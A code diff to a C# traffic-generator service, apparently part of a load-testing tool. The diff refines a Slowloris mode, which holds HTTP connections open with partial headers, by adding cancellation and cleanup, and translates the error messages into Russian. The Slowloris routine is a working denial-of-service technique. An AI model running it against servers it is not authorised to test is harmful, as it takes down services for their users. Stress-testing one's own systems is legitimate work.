@@ -1,17 +1,21 @@
 using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using UIIA.Models;
 
-
 namespace UIIA.Services
 {
-    public class TcpTrafficGenerator : ITrafficGenerator
+    public class TcpTrafficGenerator : ITrafficGenerator, IDisposable
     {
+        private readonly List<Task> _activeSlowlorisTasks = new();
+        private CancellationTokenSource? _slowlorisCts;
+
         public string Protocol => "tcp";
 
         public async Task<MetricRecord> SendRequestAsync(string target, TestConfig config)
@@ -22,6 +26,18 @@ namespace UIIA.Services
             }
 
             return await StandardTcpAsync(target, config);
+        }
+
+        public void CancelSlowlorisConnections()
+        {
+            _slowlorisCts?.Cancel();
+            _slowlorisCts?.Dispose();
+            _slowlorisCts = null;
+        }
+
+        public void Dispose()
+        {
+            CancelSlowlorisConnections();
         }
 
         private async Task<MetricRecord> StandardTcpAsync(string target, TestConfig config)
@@ -37,12 +53,12 @@ namespace UIIA.Services
                 var connectTask = client.ConnectAsync(uri.Host, uri.Port);
                 if (await Task.WhenAny(connectTask, Task.Delay(config.TimeoutMs)) != connectTask)
                 {
-                    throw new TimeoutException("Connection timed out.");
+                    throw new TimeoutException("Таймаут подключения.");
                 }
 
                 using var stream = client.GetStream();
                 var message = "PING\r\n";
-                var buffer = Encoding.ASCII.GetBytes(message);
+                var buffer = Encoding.UTF8.GetBytes(message);
 
                 await stream.WriteAsync(buffer, 0, buffer.Length);
 
@@ -73,15 +89,21 @@ namespace UIIA.Services
 
             try
             {
+                if (_slowlorisCts == null)
+                {
+                    _slowlorisCts = new CancellationTokenSource();
+                }
+
                 var uri = new Uri(target);
                 var host = uri.Host;
                 var port = uri.Port > 0 ? uri.Port : (uri.Scheme == "https" ? 443 : 80);
 
-                using var client = new TcpClient();
+                var client = new TcpClient();
                 var connectTask = client.ConnectAsync(host, port);
                 if (await Task.WhenAny(connectTask, Task.Delay(config.TimeoutMs)) != connectTask)
                 {
-                    throw new TimeoutException();
+                    client.Dispose();
+                    throw new TimeoutException("Таймаут подключения.");
                 }
 
                 Stream stream = client.GetStream();
@@ -93,15 +115,27 @@ namespace UIIA.Services
                     stream = sslStream;
                 }
 
-                var writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = false };
-                await writer.WriteAsync($"GET / HTTP/1.1\r\n");
+                var writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = false };
+                await writer.WriteAsync("GET / HTTP/1.1\r\n");
                 await writer.WriteAsync($"Host: {host}\r\n");
                 await writer.WriteAsync("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n");
                 await writer.WriteAsync("Accept: */*\r\n");
                 await writer.WriteAsync("Connection: keep-alive\r\n");
                 await writer.FlushAsync();
 
-                _ = HoldConnectionAsync(writer, config);
+                var holdTask = HoldConnectionAsync(writer, client, config, _slowlorisCts.Token);
+                lock (_activeSlowlorisTasks)
+                {
+                    _activeSlowlorisTasks.Add(holdTask);
+                }
+
+                _ = holdTask.ContinueWith(_ =>
+                {
+                    lock (_activeSlowlorisTasks)
+                    {
+                        _activeSlowlorisTasks.Remove(holdTask);
+                    }
+                }, TaskScheduler.Default);
 
                 record.StatusCode = 200;
                 record.IsError = false;
@@ -119,20 +153,59 @@ namespace UIIA.Services
             return record;
         }
 
-        private async Task HoldConnectionAsync(StreamWriter writer, TestConfig config)
+        private async Task HoldConnectionAsync(StreamWriter writer, TcpClient client, TestConfig config, CancellationToken ct)
         {
             try
             {
                 var delay = config.PacketDelayMs > 0 ? config.PacketDelayMs : 1000;
-                while (true)
+                while (!ct.IsCancellationRequested)
                 {
-                    await Task.Delay(delay);
+                    await Task.Delay(delay, ct);
                     await writer.WriteAsync("X-a: b\r\n");
-                    await writer.FlushAsync();
+                    await writer.FlushAsync(ct);
                 }
             }
-            catch
+            catch (OperationCanceledException)
             {
+            }
+            catch (IOException)
+            {
+            }
+            catch (ObjectDisposedException)
+            {
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine(
+                    $"Ошибка в Slowloris-соединении: {ex.GetType().Name} - {ex.Message}");
+            }
+            finally
+            {
+                try
+                {
+                    writer.Dispose();
+                }
+                catch (ObjectDisposedException)
+                {
+                }
+                catch (Exception ex)
+                {
+                    System.Diagnostics.Debug.WriteLine(
+                        $"Ошибка при освобождении писателя: {ex.Message}");
+                }
+
+                try
+                {
+                    client.Dispose();
+                }
+                catch (ObjectDisposedException)
+                {
+                }
+                catch (Exception ex)
+                {
+                    System.Diagnostics.Debug.WriteLine(
+                        $"Ошибка при освобождении клиента: {ex.Message}");
+                }
             }
         }
     }
